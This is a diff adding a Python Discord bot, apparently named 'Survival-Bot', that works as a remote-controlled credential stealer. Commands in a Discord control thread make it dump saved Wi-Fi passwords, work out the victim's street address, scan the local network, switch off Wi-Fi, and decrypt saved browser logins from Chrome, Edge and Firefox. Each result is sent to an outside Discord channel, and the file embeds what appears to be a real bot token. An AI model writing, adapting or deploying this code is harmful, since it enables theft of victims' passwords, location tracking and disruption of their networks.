@@ -1,0 +1,312 @@
+
+import sys
+import subprocess
+import importlib.util
+
+# ---------- AUTO-INSTALLATION FEHLENDER PAKETE ----------
+def install_and_import(package, import_name=None):
+    if import_name is None:
+        import_name = package.replace('-', '_')
+    spec = importlib.util.find_spec(import_name)
+    if spec is None:
+        print(f"📦 Installiere {package}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package])
+        print(f"✅ {package} installiert.")
+    else:
+        print(f"✓ {package} bereits vorhanden.")
+
+# Benötigte Pakete
+install_and_import("discord.py", "discord")
+install_and_import("requests")
+install_and_import("pywin32", "win32crypt")  # win32crypt als Test-Import
+
+# Ab hier normale Imports – sind jetzt garantiert installiert
+import discord
+from discord.ext import commands
+import requests
+import re
+import socket
+import os
+import time
+import json
+import sqlite3
+import shutil
+import base64
+import asyncio
+import win32crypt
+from pathlib import Path
+
+# ---------- KONFIGURATION ----------
+intents = discord.Intents.default()
+intents.message_content = True
+intents.guilds = True
+intents.guild_messages = True
+
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+CONTROL_THREAD_ID = None
+TARGET_CHANNEL_ID = 1469791791371915274
+BOT_TOKEN = "MTQ3MTIyNDM5Mjc2NjcxODE5NA.GJfH4a.2DPbUmwAr5cfkRpr5vknezt96Lvgq0rGOeomZU"
+
+# ---------- THREAD ERSTELLEN / SUCHEN ----------
+def is_control_thread(ctx):
+    return ctx.channel.id == CONTROL_THREAD_ID
+
+@bot.event
+async def on_ready():
+    global CONTROL_THREAD_ID
+    print(f'✅ Bot online als {bot.user}')
+    channel = bot.get_channel(TARGET_CHANNEL_ID)
+    if not channel:
+        print("❌ Channel nicht gefunden.")
+        return
+
+    # Bestehenden Thread suchen
+    active_threads = channel.threads
+    control_thread = None
+    for thread in active_threads:
+        if thread.name == "🎮-control-panel":
+            control_thread = thread
+            break
+
+    if not control_thread:
+        control_thread = await channel.create_thread(
+            name="🎮-control-panel",
+            type=discord.ChannelType.public_thread
+        )
+        await control_thread.send("**🛰️ Kontroll-Panel bereit.**\nBefehle nur hier gültig.")
+    else:
+        await control_thread.send("🔄 Bot neugestartet – Kontroll-Panel aktiv.")
+
+    CONTROL_THREAD_ID = control_thread.id
+
+# ---------- HILFSFUNKTIONEN ----------
+def get_local_ip():
+    if os.name == 'nt':
+        out = subprocess.getoutput('ipconfig | findstr "IPv4"')
+        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', out)
+        return match.group(1) if match else None
+    return subprocess.getoutput('hostname -I').split()[0]
+
+def get_network_range():
+    ip = get_local_ip()
+    if not ip:
+        return "192.168.1.0/24"
+    parts = ip.split('.')
+    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+
+def get_location_address():
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+        geo = requests.get(f'http://ip-api.com/json/{ip}?fields=lat,lon', timeout=5).json()
+        lat, lon = geo.get('lat'), geo.get('lon')
+        if not lat or not lon:
+            return "Unbekannte Position"
+        headers = {'User-Agent': 'SurvivalBot/1.0'}
+        osm = requests.get(
+            f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json',
+            headers=headers, timeout=5
+        ).json()
+        return osm.get('display_name', 'Unbekannt')
+    except Exception:
+        return "Standortermittlung fehlgeschlagen"
+
+# ---------- BEFEHLE ----------
+@bot.command()
+@commands.check(is_control_thread)
+async def wlanpasswords(ctx):
+    """Alle gespeicherten WLAN-Passwörter + aktuelle Adresse"""
+    if os.name != 'nt':
+        await ctx.send("❌ Nur Windows unterstützt.")
+        return
+
+    addr = get_location_address()
+    await ctx.send(f"📍 **Standort:** {addr}")
+
+    try:
+        profiles_data = subprocess.getoutput('netsh wlan show profiles')
+        profile_names = re.findall(r'Profil f[üu]r alle Benutzer\s*:\s*(.*)$', profiles_data, re.MULTILINE)
+        if not profile_names:
+            profile_names = re.findall(r'All User Profile\s*:\s*(.*)$', profiles_data, re.MULTILINE)
+
+        result = "**📶 WLAN-Netzwerke & Passwörter:**\n"
+        for ssid in profile_names:
+            ssid = ssid.strip()
+            try:
+                pass_data = subprocess.getoutput(f'netsh wlan show profile name="{ssid}" key=clear')
+                pw_match = re.search(r'Schl[üu]sselinhalt\s*:\s*(.*)$', pass_data, re.MULTILINE)
+                if not pw_match:
+                    pw_match = re.search(r'Key Content\s*:\s*(.*)$', pass_data, re.MULTILINE)
+                pw = pw_match.group(1).strip() if pw_match else "[kein Passwort]"
+                result += f"• **{ssid}** : `{pw}`\n"
+            except:
+                result += f"• **{ssid}** : [Fehler]\n"
+
+        # Aufteilen bei Längenüberschreitung
+        if len(result) > 2000:
+            for i in range(0, len(result), 1900):
+                await ctx.send(result[i:i+1900])
+        else:
+            await ctx.send(result)
+    except Exception as e:
+        await ctx.send(f"⚠️ Fehler: {str(e)[:100]}")
+
+@bot.command()
+@commands.check(is_control_thread)
+async def devicelist(ctx):
+    """Alle Geräte im aktuellen WLAN"""
+    await ctx.send("🔍 Scanne Netzwerk...")
+    try:
+        if os.name == 'nt':
+            arp_out = subprocess.getoutput('arp -a')
+            devices = re.findall(r'(\d+\.\d+\.\d+\.\d+)\s+([-0-9a-f]{17})', arp_out.lower())
+        else:
+            arp_out = subprocess.getoutput('arp -a')
+            devices = re.findall(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([-0-9a-f:]{17})', arp_out.lower())
+
+        result = "**📱 Geräte im Netzwerk:**\n"
+        for ip, mac in devices[:30]:
+            try:
+                hostname = socket.gethostbyaddr(ip)[0]
+            except:
+                hostname = "?"
+            result += f"• `{ip}` – {hostname} – {mac}\n"
+
+        if len(result) > 2000:
+            for i in range(0, len(result), 1900):
+                await ctx.send(result[i:i+1900])
+        else:
+            await ctx.send(result)
+    except Exception as e:
+        await ctx.send(f"⚠️ Fehler: {str(e)[:100]}")
+
+@bot.command()
+@commands.check(is_control_thread)
+async def shutwifi(ctx, seconds: int):
+    """WLAN für X Sekunden deaktivieren (Admin!)"""
+    if os.name != 'nt':
+        await ctx.send("❌ Nur Windows.")
+        return
+
+    def get_wlan_iface():
+        out = subprocess.getoutput('netsh interface show interface')
+        for line in out.splitlines():
+            if 'WLAN' in line or 'Wi-Fi' in line or 'Wireless' in line:
+                parts = line.split()
+                if len(parts) >= 4:
+                    return parts[-1]
+        return None
+
+    iface = get_wlan_iface()
+    if not iface:
+        await ctx.send("❌ Keine WLAN-Schnittstelle gefunden.")
+        return
+
+    await ctx.send(f"⚠️ Deaktiviere `{iface}` für {seconds} Sekunden...")
+    try:
+        subprocess.run(f'netsh interface set interface "{iface}" disable', shell=True, timeout=5)
+        await ctx.send(f"✅ WLAN AUS. Warte {seconds}s...")
+        await asyncio.sleep(seconds)
+        subprocess.run(f'netsh interface set interface "{iface}" enable', shell=True, timeout=5)
+        await ctx.send("✅ WLAN AN.")
+    except Exception as e:
+        await ctx.send(f"⚠️ Fehler: {str(e)[:100]}")
+        # Notfall-Wiederherstellung
+        subprocess.run(f'netsh interface set interface "{iface}" enable', shell=True)
+
+@bot.command()
+@commands.check(is_control_thread)
+async def sendpasses(ctx):
+    """Sammelt alle Passwörter aus Chrome, Edge, Firefox"""
+    await ctx.send("🔑 Extrahiere Browser-Passwörter...")
+    result = ""
+
+    # ----- CHROME -----
+    chrome_db = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
+    if os.path.exists(chrome_db):
+        try:
+            temp = os.path.join(os.environ['TEMP'], 'chrome_tmp.db')
+            shutil.copy2(chrome_db, temp)
+            conn = sqlite3.connect(temp)
+            cur = conn.cursor()
+            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
+            result += "**💻 CHROME:**\n"
+            for url, user, enc in cur.fetchall():
+                if user or enc:
+                    try:
+                        pw = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8')
+                    except:
+                        pw = "[verschlüsselt]"
+                    result += f"• {url}\n  User: {user}\n  Pass: {pw}\n\n"
+            conn.close()
+            os.remove(temp)
+        except Exception as e:
+            result += f"Chrome-Fehler: {e}\n"
+    else:
+        result += "Chrome nicht gefunden.\n"
+
+    # ----- EDGE -----
+    edge_db = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
+    if os.path.exists(edge_db):
+        try:
+            temp = os.path.join(os.environ['TEMP'], 'edge_tmp.db')
+            shutil.copy2(edge_db, temp)
+            conn = sqlite3.connect(temp)
+            cur = conn.cursor()
+            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
+            result += "**🌐 EDGE:**\n"
+            for url, user, enc in cur.fetchall():
+                if user or enc:
+                    try:
+                        pw = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8')
+                    except:
+                        pw = "[verschlüsselt]"
+                    result += f"• {url}\n  User: {user}\n  Pass: {pw}\n\n"
+            conn.close()
+            os.remove(temp)
+        except Exception as e:
+            result += f"Edge-Fehler: {e}\n"
+    else:
+        result += "Edge nicht gefunden.\n"
+
+    # ----- FIREFOX -----
+    ff_dir = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
+    if os.path.exists(ff_dir):
+        result += "**🦊 FIREFOX:**\n"
+        found = False
+        try:
+            for profile in os.listdir(ff_dir):
+                logins_json = os.path.join(ff_dir, profile, 'logins.json')
+                if os.path.exists(logins_json):
+                    found = True
+                    with open(logins_json, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                        for entry in data.get('logins', []):
+                            host = entry.get('hostname', '')
+                            ub64 = entry.get('encryptedUsername', '')
+                            pb64 = entry.get('encryptedPassword', '')
+                            try:
+                                user = base64.b64decode(ub64).decode('utf-8', errors='ignore')
+                                pwd = base64.b64decode(pb64).decode('utf-8', errors='ignore')
+                            except:
+                                user = "[codiert]"
+                                pwd = "[codiert]"
+                            result += f"• {host}\n  User: {user}\n  Pass: {pwd}\n\n"
+        except Exception as e:
+            result += f"Firefox-Fehler: {e}\n"
+        if not found:
+            result += "Keine Firefox-Logins.\n"
+    else:
+        result += "Firefox nicht gefunden.\n"
+
+    # Ausgabe (ggf. splitten)
+    if len(result) > 2000:
+        for i in range(0, len(result), 1900):
+            await ctx.send(result[i:i+1900])
+    else:
+        await ctx.send(result if result else "Keine Passwörter gefunden.")
+
+# ---------- START ----------
+if __name__ == "__main__":
+    print("🚀 Starte Survival-Bot...")
+    bot.run(BOT_TOKEN)
